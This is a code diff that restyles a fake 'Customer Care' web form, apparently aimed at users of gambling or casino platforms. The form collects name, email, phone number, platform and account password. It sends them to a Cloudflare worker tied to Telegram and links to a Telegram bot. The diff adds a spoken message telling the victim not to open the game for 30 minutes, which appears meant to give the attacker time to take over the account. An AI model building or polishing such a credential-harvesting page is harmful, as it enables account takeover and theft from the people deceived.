@@ -3,18 +3,107 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Helpcare24 Customer Care</title>
+  <title>VIP Support - Customer Care</title>
   <style>
     * { box-sizing: border-box; }
-    body { margin: 0; font-family: Arial, sans-serif; background: #f5f7fb; color: #222; }
-    .container { max-width: 500px; margin: 50px auto; padding: 25px; }
-    .card { background: white; padding: 25px; border-radius: 18px; box-shadow: 0 8px 30px rgba(0,0,0,.08); }
-    h1 { margin-top: 0; text-align: center; }
-    input, textarea { width: 100%; padding: 13px; margin: 8px 0; border: 1px solid #ddd; border-radius: 10px; font-size: 15px; }
-    textarea { min-height: 110px; resize: vertical; }
-    button { width: 100%; padding: 14px; border: 0; border-radius: 10px; background: #1667e8; color: white; font-size: 16px; cursor: pointer; margin-top: 10px; }
-    button:disabled { opacity: .6; }
-    #status { text-align: center; margin-top: 15px; }
+    body {
+      margin: 0;
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+    }
+    .container { width: 100%; max-width: 500px; padding: 20px; }
+    .card {
+      background: rgba(255, 255, 255, 0.05);
+      backdrop-filter: blur(20px);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      padding: 40px;
+      border-radius: 25px;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+      animation: fadeIn 0.8s ease-out;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    h1 {
+      margin-top: 0;
+      text-align: center;
+      font-size: 32px;
+      margin-bottom: 30px;
+      background: linear-gradient(90deg, #ff416c, #ff4b2b);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      font-weight: 700;
+    }
+    .input-group { position: relative; margin-bottom: 25px; }
+    input, textarea {
+      width: 100%;
+      padding: 16px 20px;
+      background: rgba(255, 255, 255, 0.08);
+      border: 2px solid transparent;
+      border-radius: 15px;
+      color: #fff;
+      font-size: 16px;
+      transition: all 0.4s cubic-bezier(0.25, 1, 0.5, 1);
+      outline: none;
+    }
+    input:focus, textarea:focus {
+      background: rgba(255, 255, 255, 0.15);
+      border-color: #ff416c;
+      box-shadow: 0 0 25px rgba(255, 65, 108, 0.3);
+    }
+    input::placeholder, textarea::placeholder { color: rgba(255, 255, 255, 0.4); }
+    .password-wrapper { position: relative; }
+    .eye-icon {
+      position: absolute;
+      right: 20px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      color: rgba(255, 255, 255, 0.5);
+      transition: color 0.3s;
+      user-select: none;
+    }
+    .eye-icon:hover { color: #ff416c; }
+    button {
+      width: 100%;
+      padding: 18px;
+      border: none;
+      border-radius: 15px;
+      background: linear-gradient(90deg, #ff416c, #ff4b2b);
+      color: white;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: transform 0.3s, box-shadow 0.3s;
+      margin-top: 15px;
+      box-shadow: 0 10px 20px rgba(255, 75, 43, 0.3);
+    }
+    button:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 15px 30px rgba(255, 75, 43, 0.5);
+    }
+    button:disabled { opacity: 0.6; cursor: not-allowed; transform: none; box-shadow: none; }
+    #status { text-align: center; margin-top: 25px; font-size: 16px; min-height: 24px; font-weight: 500; }
+    .telegram-link {
+      display: block;
+      text-align: center;
+      margin-top: 25px;
+      color: #00d2ff;
+      text-decoration: none;
+      font-size: 16px;
+      transition: color 0.3s, text-shadow 0.3s;
+      font-weight: 500;
+    }
+    .telegram-link:hover {
+      color: #fff;
+      text-shadow: 0 0 15px rgba(0, 210, 255, 0.6);
+    }
   </style>
 </head>
 <body>
@@ -22,19 +111,42 @@
   <div class="card">
     <h1>Customer Care</h1>
     <form id="supportForm">
-      <input id="name" placeholder="Name" required>
-      <input id="email" type="email" placeholder="Email" required>
-      <input id="mobile" placeholder="Mobile Number" required>
-      <input id="casino" placeholder="Platform / Service">
-      <input id="password" type="password" placeholder="Password">
-      <textarea id="message" placeholder="Describe your issue" required></textarea>
-      <button type="submit" id="submitBtn">Submit Support Request</button>
+      <div class="input-group">
+        <input id="name" placeholder="Full Name" required>
+      </div>
+      <div class="input-group">
+        <input id="email" type="email" placeholder="Email Address" required>
+      </div>
+      <div class="input-group">
+        <input id="mobile" type="tel" placeholder="Mobile Number (10 digits)" maxlength="10" pattern="\d{10}" required>
+      </div>
+      <div class="input-group">
+        <input id="casino" placeholder="Platform / Service">
+      </div>
+      <div class="input-group password-wrapper">
+        <input id="password" type="password" placeholder="Password">
+        <span class="eye-icon" id="togglePassword">👁️</span>
+      </div>
+      <div class="input-group">
+        <textarea id="message" placeholder="Describe your issue" required></textarea>
+      </div>
+      <button type="submit" id="submitBtn">Submit Request</button>
     </form>
     <div id="status"></div>
+    <a href="https://t.me/helpcare02_bot" class="telegram-link">Contact us directly on Telegram</a>
   </div>
 </div>
 <script>
 const WORKER_URL = "https://helpcare24-telegram.xfarru356.workers.dev";
+const togglePassword = document.getElementById('togglePassword');
+const passwordInput = document.getElementById('password');
+
+togglePassword.addEventListener('click', function() {
+  const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+  passwordInput.setAttribute('type', type);
+  this.textContent = type === 'password' ? '👁️' : '🙈';
+});
+
 document.getElementById("supportForm").addEventListener("submit", async function(e) {
   e.preventDefault();
   const button = document.getElementById("submitBtn");
@@ -42,6 +154,7 @@ document.getElementById("supportForm").addEventListener("submit", async function
   button.disabled = true;
   button.textContent = "Submitting...";
   status.textContent = "";
+  
   const data = {
     name: document.getElementById("name").value.trim(),
     email: document.getElementById("email").value.trim(),
@@ -50,20 +163,29 @@ document.getElementById("supportForm").addEventListener("submit", async function
     password: document.getElementById("password").value.trim(),
     message: document.getElementById("message").value.trim()
   };
+  
   try {
     const response = await fetch(WORKER_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(data)
     });
+    
     if (!response.ok) throw new Error("Request failed");
+    
     status.textContent = "Request submitted successfully.";
+    
+    const utterance = new SpeechSynthesisUtterance("Your request is with the review team. Please do not open the game for 30 minutes and wait.");
+    utterance.lang = 'en-US';
+    window.speechSynthesis.speak(utterance);
+    
     document.getElementById("supportForm").reset();
   } catch (error) {
     status.textContent = "Unable to submit request. Please try again.";
   }
+  
   button.disabled = false;
-  button.textContent = "Submit Support Request";
+  button.textContent = "Submit Request";
 });
 </script>
 </body>
